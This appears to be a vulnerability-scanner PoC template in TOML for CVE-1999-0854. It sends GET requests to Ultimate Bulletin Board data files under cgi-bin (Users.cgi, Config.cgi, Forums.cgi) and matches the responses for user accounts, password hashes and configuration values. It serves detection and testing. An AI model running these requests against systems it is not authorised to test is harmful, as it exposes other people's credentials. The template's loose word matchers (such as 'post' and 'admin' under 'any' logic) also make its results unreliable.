[info]
author = "ave"
description = "Ultimate Bulletin Board 将数据文件存储在 cgi-bin 可执行目录中，当 HTTP 服务器尝试执行这些数据文件时触发执行错误，导致文件内容以明文形式返回给远程攻击者，造成敏感数据（用户帐号、密码哈希、配置信息）泄露。"
id = "POC-AVE-1999-0653"
name = "CVE-1999-0854 Ultimate Bulletin Board cgi-bin 目录敏感信息泄露 PoC"
severity = "medium"
tags = ["ave-1999-0653"]
vuln_id = [
    "CVE-1999-0854",
    "AVE-1999-0653",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/ubb/Users.cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "password",
    "username",
    "admin",
]

[[poc.requests]]
method = "GET"
path = "/cgi-bin/ubb/Config.cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "$config",
    "db_",
    "sql_",
    "password",
    "admin",
]

[[poc.requests]]
method = "GET"
path = "/cgi-bin/ubb/Forums.cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "forum",
    "category",
    "topic",
    "post",
]

